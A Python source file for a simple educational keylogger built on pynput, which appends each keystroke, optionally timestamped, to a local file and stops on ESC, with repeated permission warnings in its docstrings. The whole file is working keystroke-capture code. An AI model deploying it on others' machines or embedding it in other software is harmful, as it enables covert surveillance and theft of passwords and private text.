# keylogger_oop_basic.py
"""
Basic Keylogger Program (OOP style)
- Records keys pressed and appends them to a file.
- Focus: logging keystrokes and saving them to a file.
- Ethical reminder: permissions and ethical considerations are crucial.
  Do NOT use this on systems you do not own or have explicit permission to test.
"""

from pynput.keyboard import Key, Listener
from datetime import datetime
import threading

class Keylogger:
    """
    Simple, educational keylogger class.
    Use only on systems where you have permission.
    """

    def __init__(self, log_file="key_log.txt", include_timestamps=False, stop_key=Key.esc):
        """
        :param log_file: Path to append logged keystrokes
        :param include_timestamps: If True, prefix each logged key with a timestamp
        :param stop_key: A pynput.keyboard.Key used to stop the logger (default: ESC)
        """
        self.log_file = log_file
        self.include_timestamps = include_timestamps
        self.stop_key = stop_key

        self._listener = None
        self._running = False
        self._lock = threading.Lock()

    def _format_key(self, key):
        k = str(key).replace("'", "")
        if k == "Key.space":
            return " "
        if k == "Key.enter":
            return "\n"
        if k.startswith("Key."):
            return f"[{k}]"
        return k

    def _write(self, text):
        with self._lock:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(text)

    def _log_key(self, key):
        formatted = self._format_key(key)
        if self.include_timestamps:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry = f"{ts} : {formatted}\n" if formatted == "\n" else f"{ts} : {formatted}"
        else:
            entry = formatted
        self._write(entry)

    def _on_press(self, key):
        try:
            self._log_key(key)
        except Exception:
            pass

        if key == self.stop_key:
            self.stop()

    def _on_release(self, key):
        # kept for possible extension; currently not used
        return

    def start(self, block=False):
        """
        Start listening for key presses.
        :param block: if True, this call blocks until listener stops; otherwise it runs in background
        """
        if self._running:
            return

        self._listener = Listener(on_press=self._on_press, on_release=self._on_release)
        self._running = True

        if block:
            self._listener.start()
            try:
                self._listener.join()
            finally:
                self._running = False
        else:
            self._listener.start()

    def stop(self):
        """Stop the listener."""
        if not self._running:
            return
        try:
            if self._listener is not None:
                self._listener.stop()
        finally:
            self._running = False

    def run(self, block=True):
        """Convenience wrapper to start the logger (blocks by default)."""
        self.start(block=block)

# Example usage (commented) - keep here for quick reference:
# from pynput.keyboard import Key
# k = Keylogger(log_file="key_log.txt", include_timestamps=False, stop_key=Key.esc)
# k.run(block=True)   # starts and blocks until ESC pressed
# OR
# k.start(block=False)  # runs in background; call k.stop() to stop
